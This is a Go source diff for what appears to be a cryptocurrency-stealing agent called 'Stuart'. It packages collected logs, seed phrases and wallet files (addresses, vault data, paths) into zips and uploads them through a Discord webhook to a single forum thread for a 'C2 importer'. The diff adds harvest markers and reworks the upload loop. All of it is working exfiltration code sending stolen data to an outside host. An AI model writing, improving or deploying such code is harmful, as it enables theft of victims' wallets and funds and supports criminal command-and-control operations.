@@ -62,118 +62,123 @@ type walletBlob struct {
 	Data      []byte
 }
 
-// uploadHarvestToDiscord posts log + wallet zips to Discord via webhook (HTTP).
-// Returns thread ID (forum post channel id) for the C2 to import later.
+// harvestMarker is embedded in every Discord message + zip meta so the server
+// only imports real Stuart posts (never random forum spam).
+const harvestMarkerPrefix = "STUART_HARVEST_ID:"
+
+func newHarvestID(clientID string) string {
+	return fmt.Sprintf("%s-%d", safeName(clientID, 24), time.Now().UnixNano())
+}
+
+func harvestContentLine(harvestID, clientID string, nLogs, nWallets int) string {
+	return fmt.Sprintf(
+		"**Stuart harvest**\n%s `%s`\nClient: `%s`\nFiles: logs=%d wallets=%d\nTime: %s\n_Do not delete — server import uses this marker._",
+		harvestMarkerPrefix, harvestID, clientID, nLogs, nWallets, time.Now().UTC().Format(time.RFC3339),
+	)
+}
+
+// uploadHarvestToDiscord posts ALL files into exactly ONE forum post (thread).
+// First attachment creates the thread; every later file uses thread_id only (never thread_name again).
+// Returns threadID + harvestID for the C2 importer.
 func uploadHarvestToDiscord(
 	clientID string,
 	result *recovery.CollectionResult,
 	seeds []recovery.SeedResult,
 	wallets []walletBlob,
 	cfg discordAgentConfig,
-) (threadID string, err error) {
+) (threadID string, harvestID string, err error) {
 	if cfg.WebhookURL == "" {
-		return "", fmt.Errorf("discord webhook URL empty")
+		return "", "", fmt.Errorf("discord webhook URL empty")
 	}
 
-	logParts, err := buildLogZipParts(clientID, result, seeds)
+	harvestID = newHarvestID(clientID)
+
+	logParts, err := buildLogZipParts(clientID, harvestID, result, seeds)
 	if err != nil {
-		return "", err
+		return "", harvestID, err
 	}
-	walletParts, err := buildWalletZipPartsAgent(clientID, wallets)
+	walletParts, err := buildWalletZipPartsAgent(clientID, harvestID, wallets)
 	if err != nil {
-		return "", err
+		return "", harvestID, err
+	}
+
+	// Single ordered queue: logs first, then wallets — one post only
+	var all []zipPart
+	all = append(all, logParts...)
+	all = append(all, walletParts...)
+	if len(all) == 0 {
+		return "", harvestID, fmt.Errorf("nothing to upload")
 	}
 
 	prefix := cfg.ThreadPrefix
 	if prefix == "" {
 		prefix = "Stuart"
 	}
-	threadName := fmt.Sprintf("%s %s %s", prefix, safeName(clientID, 40), time.Now().UTC().Format("2006-01-02 15:04"))
+	// Forum title (one post)
+	threadName := fmt.Sprintf("%s %s %s", prefix, safeName(clientID, 36), time.Now().UTC().Format("2006-01-02 15:04"))
 	if len(threadName) > 100 {
 		threadName = threadName[:100]
 	}
 
-	content := fmt.Sprintf("**Stuart harvest**\nClient: `%s`\nLogs: %d part(s) · Wallets: %d file(s) · %s",
-		clientID, len(logParts), len(walletParts), time.Now().UTC().Format(time.RFC3339))
+	baseContent := harvestContentLine(harvestID, clientID, len(logParts), len(walletParts))
 
-	// 1) Logs create the forum post
-	var msg map[string]interface{}
-	if len(logParts) > 0 {
-		msg, err = postDiscordWebhook(cfg.WebhookURL, content, threadName, "", logParts)
-		if err != nil {
-			return "", fmt.Errorf("log upload: %w", err)
-		}
-		if ch, ok := msg["channel_id"].(string); ok {
-			threadID = ch
-		}
-		log.Printf("[recovery] Discord logs uploaded thread=%s parts=%d", threadID, len(logParts))
+	// ── Message 1: creates the ONLY forum post ──────────────────────────
+	first := all[0]
+	if len(first.Data) > discordPartMax {
+		return "", harvestID, fmt.Errorf("first part too large for Discord: %s (%d bytes)", first.Name, len(first.Data))
 	}
+	msg, err := postDiscordWebhookOnce(cfg.WebhookURL,
+		baseContent+"\n_File 1/"+fmt.Sprint(len(all))+": `"+first.Name+"`_",
+		threadName, "", []zipPart{first})
+	if err != nil {
+		return "", harvestID, fmt.Errorf("create post: %w", err)
+	}
+	threadID = discordChannelID(msg)
+	if threadID == "" {
+		return "", harvestID, fmt.Errorf("discord response missing channel_id (thread id) — cannot attach more files to same post")
+	}
+	log.Printf("[recovery] Discord ONE post created thread=%s harvest=%s file=%s", threadID, harvestID, first.Name)
 
-	// 2) Wallets on the SAME forum thread
-	if len(walletParts) > 0 {
-		wContent := fmt.Sprintf("**Stuart wallets**\nClient: `%s`\nWallets: %d", clientID, len(wallets))
-		wMsg, werr := postDiscordWebhook(cfg.WebhookURL, wContent, "", threadID, walletParts)
-		if werr != nil {
-			// If no thread yet, create post with wallets
-			if threadID == "" {
-				wMsg, werr = postDiscordWebhook(cfg.WebhookURL, wContent, threadName, "", walletParts)
-			}
-			if werr != nil {
-				return threadID, fmt.Errorf("wallet upload: %w", werr)
-			}
-		}
-		if threadID == "" {
-			if ch, ok := wMsg["channel_id"].(string); ok {
-				threadID = ch
-			}
-		}
-		log.Printf("[recovery] Discord wallets uploaded thread=%s parts=%d", threadID, len(walletParts))
-	}
-
-	if threadID == "" && msg != nil {
-		if ch, ok := msg["channel_id"].(string); ok {
-			threadID = ch
-		}
-	}
-	return threadID, nil
-}
-
-func postDiscordWebhook(webhookURL, content, threadName, threadID string, parts []zipPart) (map[string]interface{}, error) {
-	if len(parts) == 0 {
-		return nil, fmt.Errorf("no parts")
-	}
-	// One file at a time for reliability under 8 MiB limits
-	var first map[string]interface{}
-	tid := threadID
-	for i, p := range parts {
+	// ── Messages 2..N: same thread only (thread_id, never thread_name) ───
+	for i := 1; i < len(all); i++ {
+		p := all[i]
 		if len(p.Data) > discordPartMax {
 			log.Printf("[recovery] Discord skip oversized part %s (%d bytes)", p.Name, len(p.Data))
 			continue
 		}
-		partContent := content
-		if len(parts) > 1 {
-			partContent = fmt.Sprintf("%s\n_Part %d/%d: `%s`_", content, i+1, len(parts), p.Name)
-		}
-		msg, err := postDiscordWebhookOnce(webhookURL, partContent, threadName, tid, []zipPart{p})
+		partContent := fmt.Sprintf("%s\n_File %d/%d: `%s`_", baseContent, i+1, len(all), p.Name)
+		_, err := postDiscordWebhookOnce(cfg.WebhookURL, partContent, "", threadID, []zipPart{p})
 		if err != nil {
-			return first, err
+			// Do NOT fall back to a new post — that was creating duplicates
+			log.Printf("[recovery] Discord attach failed (same post) file=%s: %v", p.Name, err)
+			return threadID, harvestID, fmt.Errorf("attach file %d/%d %s: %w", i+1, len(all), p.Name, err)
 		}
-		if first == nil {
-			first = msg
-			if tid == "" {
-				if ch, ok := msg["channel_id"].(string); ok {
-					tid = ch
-				}
-			}
-			// Only first message may create the forum thread
-			threadName = ""
+		log.Printf("[recovery] Discord same-post file %d/%d ok %s thread=%s", i+1, len(all), p.Name, threadID)
+		time.Sleep(200 * time.Millisecond) // gentle rate limit
+	}
+
+	log.Printf("[recovery] Discord harvest complete harvest=%s thread=%s files=%d (single post)", harvestID, threadID, len(all))
+	return threadID, harvestID, nil
+}
+
+func discordChannelID(msg map[string]interface{}) string {
+	if msg == nil {
+		return ""
+	}
+	switch v := msg["channel_id"].(type) {
+	case string:
+		return v
+	case json.Number:
+		return v.String()
+	case float64:
+		return fmt.Sprintf("%.0f", v)
+	default:
+		// snowflake sometimes unmarshaled oddly
+		if s, ok := msg["channel_id"]; ok {
+			return fmt.Sprint(s)
 		}
-		log.Printf("[recovery] Discord webhook ok file=%s bytes=%d thread=%s", p.Name, len(p.Data), tid)
 	}
-	if first == nil {
-		return nil, fmt.Errorf("all parts skipped or failed")
-	}
-	return first, nil
+	return ""
 }
 
 func postDiscordWebhookOnce(webhookURL, content, threadName, threadID string, parts []zipPart) (map[string]interface{}, error) {
@@ -181,6 +186,7 @@ func postDiscordWebhookOnce(webhookURL, content, threadName, threadID string, pa
 	w := multipart.NewWriter(&body)
 
 	payload := map[string]interface{}{"content": content}
+	// CRITICAL: thread_name ONLY when creating a brand-new forum post (no thread_id yet)
 	if threadName != "" && threadID == "" {
 		payload["thread_name"] = threadName
 	}
@@ -227,13 +233,15 @@ func postDiscordWebhookOnce(webhookURL, content, threadName, threadID string, pa
 		return nil, fmt.Errorf("discord HTTP %d: %s", res.StatusCode, truncate(string(raw), 300))
 	}
 	var msg map[string]interface{}
-	if err := json.Unmarshal(raw, &msg); err != nil {
+	dec := json.NewDecoder(bytes.NewReader(raw))
+	dec.UseNumber()
+	if err := dec.Decode(&msg); err != nil {
 		return map[string]interface{}{"ok": true}, nil
 	}
 	return msg, nil
 }
 
-func buildLogZipParts(clientID string, result *recovery.CollectionResult, seeds []recovery.SeedResult) ([]zipPart, error) {
+func buildLogZipParts(clientID, harvestID string, result *recovery.CollectionResult, seeds []recovery.SeedResult) ([]zipPart, error) {
 	if result == nil {
 		return nil, nil
 	}
@@ -316,6 +324,7 @@ func buildLogZipParts(clientID string, result *recovery.CollectionResult, seeds 
 		}
 		meta, _ := json.MarshalIndent(map[string]interface{}{
 			"v": 1, "source": "stuart", "kind": "logs", "clientId": clientID,
+			"harvestId": harvestID, "marker": harvestMarkerPrefix + harvestID,
 			"capturedAt": time.Now().UnixMilli(),
 		}, "", "  ")
 		files := []struct{ Name string; Data []byte }{
@@ -356,7 +365,7 @@ func buildLogZipParts(clientID string, result *recovery.CollectionResult, seeds 
 	return parts, nil
 }
 
-func buildWalletZipPartsAgent(clientID string, wallets []walletBlob) ([]zipPart, error) {
+func buildWalletZipPartsAgent(clientID, harvestID string, wallets []walletBlob) ([]zipPart, error) {
 	if len(wallets) == 0 {
 		return nil, nil
 	}
@@ -384,6 +393,7 @@ func buildWalletZipPartsAgent(clientID string, wallets []walletBlob) ([]zipPart,
 				}
 				meta, _ := json.MarshalIndent(map[string]interface{}{
 					"v": 1, "source": "stuart", "kind": "wallet_chunk", "clientId": clientID,
+					"harvestId": harvestID, "marker": harvestMarkerPrefix + harvestID,
 					"name": w.Name, "type": w.Type, "path": w.Path,
 					"addresses": w.Addresses, "vaultData": w.VaultData,
 					"size": len(w.Data), "chunk": c + 1, "chunks": total,
@@ -395,7 +405,7 @@ func buildWalletZipPartsAgent(clientID string, wallets []walletBlob) ([]zipPart,
 				if err != nil {
 					continue
 				}
-				name := fmt.Sprintf("%s-chunk%dof%d-%s.zip", safeName(w.Name, 40), c+1, total, stamp)
+				name := fmt.Sprintf("stuart-%s-chunk%dof%d-%s.zip", safeName(w.Name, 32), c+1, total, stamp)
 				parts = append(parts, zipPart{Name: name, Data: z})
 			}
 			continue
@@ -435,6 +445,7 @@ func buildWalletZipPartsAgent(clientID string, wallets []walletBlob) ([]zipPart,
 		}
 		meta, _ := json.MarshalIndent(map[string]interface{}{
 			"v": 1, "source": "stuart", "kind": "wallets", "clientId": clientID,
+			"harvestId": harvestID, "marker": harvestMarkerPrefix + harvestID,
 			"capturedAt": time.Now().UnixMilli(), "wallets": metaWallets,
 		}, "", "  ")
 		files = append([]struct{ Name string; Data []byte }{{prefix + "/meta.json", meta}}, files...)
